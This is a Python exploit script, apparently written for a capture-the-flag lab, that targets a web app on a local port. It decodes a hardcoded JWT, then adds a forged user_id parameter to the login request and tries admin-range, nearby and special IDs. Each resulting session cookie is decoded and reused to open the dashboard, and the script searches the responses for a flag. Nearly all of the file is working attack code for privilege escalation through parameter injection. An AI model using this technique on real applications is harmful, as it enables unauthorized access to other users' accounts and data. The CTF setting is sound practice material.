import requests
import re
import base64
import json

BASE_URL = "http://127.0.0.1:32883"
PASSWORD_TEST_URL = f"{BASE_URL}/password/test"
DASHBOARD_URL = f"{BASE_URL}/dashboard"

print("[*] Testing user_id parameter injection during authentication\n")

# First, decode the existing JWT to understand its structure
jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMiwidXNlcl90eXBlIjoiY3VzdG9tZXIifQ.ubKxvL3U9FouYhgqbsNNfV7C6iaVCJ83foZ1bq8roEs"

print("[+] Decoding existing JWT token")
parts = jwt_token.split('.')
header = base64.urlsafe_b64decode(parts[0] + '==').decode()
payload = base64.urlsafe_b64decode(parts[1] + '==').decode()
print(f"Header: {header}")
print(f"Payload: {payload}")

print("\n" + "="*60 + "\n")

# Test different user_ids to see if we can manipulate the session
print("[+] Testing user_id manipulation with different ranges\n")

# Strategy: test user_ids that might have admin/special privileges
test_ranges = [
    ("Admin range", [1, 2, 3, 4, 5, 10, 100]),
    ("Around known ID", [10030, 10031, 10032, 10033, 10034]),
    ("High privilege IDs", [9999, 10000, 10001]),
    ("Special IDs", [0, -1])
]

for range_name, user_ids in test_ranges:
    print(f"[*] Testing {range_name}")
    
    for user_id in user_ids:
        # Authenticate with user_id parameter
        auth_data = {
            'username': 'test',
            'password': 'test',
            'user_id': str(user_id)
        }
        
        auth_response = requests.post(PASSWORD_TEST_URL, data=auth_data, allow_redirects=False)
        
        if auth_response.status_code == 302:
            # Extract session cookie
            if 'Set-Cookie' in auth_response.headers:
                cookie_header = auth_response.headers['Set-Cookie']
                if 'session=' in cookie_header:
                    session_value = cookie_header.split('session=')[1].split(';')[0]
                    
                    # Decode session to see what user_id is stored
                    try:
                        session_parts = session_value.split('.')
                        if len(session_parts) >= 1:
                            session_data = base64.urlsafe_b64decode(session_parts[0] + '==').decode()
                            print(f"  user_id={user_id}: Session data: {session_data}")
                            
                            # Try to access dashboard
                            cookies = {'session': session_value}
                            try:
                                dashboard_response = requests.get(DASHBOARD_URL, cookies=cookies, timeout=5)
                                
                                if dashboard_response.status_code == 200:
                                    # Check for FLAG
                                    flag_match = re.search(r'FLAG\{[^}]+\}', dashboard_response.text)
                                    if flag_match:
                                        print(f"\n{'='*60}")
                                        print(f"  [!] FLAG FOUND with user_id={user_id}")
                                        print(f"  [!] FLAG: {flag_match.group(0)}")
                                        print(f"{'='*60}")
                                        print(f"\n  Full Dashboard Response:")
                                        print(dashboard_response.text)
                                        print(f"\n{'='*60}\n")
                                    elif "Welcome" in dashboard_response.text or "Dashboard" in dashboard_response.text:
                                        print(f"    Dashboard accessed (length: {len(dashboard_response.text)}B)")
                                        if len(dashboard_response.text) > 1200 or len(dashboard_response.text) < 1100:
                                            print(f"    [+] Unusual response size - content differs!")
                                            print(f"    Snippet: {dashboard_response.text[:400]}")
                                elif dashboard_response.status_code == 500:
                                    print(f"    500 error accessing dashboard")
                            except Exception as e:
                                print(f"    Error accessing dashboard: {e}")
                    except Exception as e:
                        pass

    print()

print("\n[*] Testing complete")

